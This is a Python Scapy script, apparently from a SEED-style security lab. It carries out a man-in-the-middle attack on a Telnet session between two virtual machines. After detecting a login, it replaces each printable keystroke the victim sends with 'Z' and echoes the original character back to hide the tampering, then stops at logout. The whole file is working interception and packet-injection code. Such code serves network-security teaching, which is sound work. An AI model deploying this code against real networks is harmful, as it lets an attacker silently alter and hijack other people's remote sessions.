#!/usr/bin/python3
from scapy.all import *

# Define IP addresses and MAC addresses
VM_A_IP = "10.0.2.5"  # Host A's IP
VM_B_IP = "10.0.2.6"  # Host B's IP
VM_A_MAC = "08:00:27:80:28:bc"
VM_B_MAC = "08:00:27:05:41:63"
VM_M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC

# Global variable to control sniffing
stop_sniffing = False
stop_sniffing2 = False
last_char = ""

def forwarding_pkt(pkt):
    global stop_sniffing
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[Ether].dst == VM_M_MAC:
        newpkt = pkt[IP]
        send(newpkt, verbose=False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP and pkt[Ether].dst == VM_M_MAC:
        newpkt = pkt[IP]
        send(newpkt, verbose=False)
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            test_code = pkt[TCP].payload.load
            if b'(RSD1)seed@seed-target2:~$ ' in test_code:
                print("Login detected!!!!")
                stop_sniffing = True  # Set the flag to stop sniffing

def spoof_pkt(pkt):
    global last_char
    global stop_sniffing2
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[Ether].dst == VM_M_MAC:
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            payload = pkt[TCP].payload.load
            newpkt = pkt[IP]
            if  not(payload and payload[0] < 0x20 or payload[0] > 0x7E):
                if last_char == "":
                    last_char = payload
                    print("************")
                    print(last_char)
                    print("************")
                # Non-printable range
                del(newpkt.chksum)  # Delete IP checksum (Scapy will recalculate it)
                del(newpkt[TCP].chksum)  # Delete TCP checksum (Scapy will recalculate it)
                del(newpkt[TCP].payload) 
                newdata = b'Z'  # New payload
                # Attach the new payload and send the packet
                newpkt = newpkt / newdata
                print(payload, end=" ")
                print("=>", end = " ")
                print(newpkt[TCP].payload.load)
            send(newpkt, verbose=False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP and pkt[Ether].dst == VM_M_MAC:
        newpkt = pkt[IP]
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            payload = pkt[TCP].payload.load
            if b'\r\nlogout\r\n' in payload:
                print("Logout detected!!!!")
                stop_sniffing2 = True  # Set the flag to stop sniffing
            if  not(payload and payload[0] < 0x20 or payload[0] > 0x7E) and last_char != "":
                # Non-printable range
                del(newpkt.chksum)  # Delete IP checksum (Scapy will recalculate it)
                del(newpkt[TCP].chksum)  # Delete TCP checksum (Scapy will recalculate it)
                del(newpkt[TCP].payload) 
                newdata = last_char  # New payload
                last_char = ""
                # Attach the new payload and send the packet
                newpkt = newpkt / newdata
                print(payload, end=" ")
                print("=>", end = " ")
                print(newpkt[TCP].payload.load)

        send(newpkt, verbose=False)
        
            

def stop_condition(pkt):
    return stop_sniffing

def stop_condition2(pkt):
    return stop_sniffing2
# Sniff TCP packets and apply the forwarding_pkt function
print("Waiting for login...")
sniff(filter='tcp', prn=forwarding_pkt, stop_filter=stop_condition)

# Reset the stop_sniffing flag for the second sniff

# After sniffing stops, start another sniff with spoof_pkt
print("Waiting to spoof...")
sniff(filter='tcp', prn=spoof_pkt, stop_filter=stop_condition2)
print("logout...")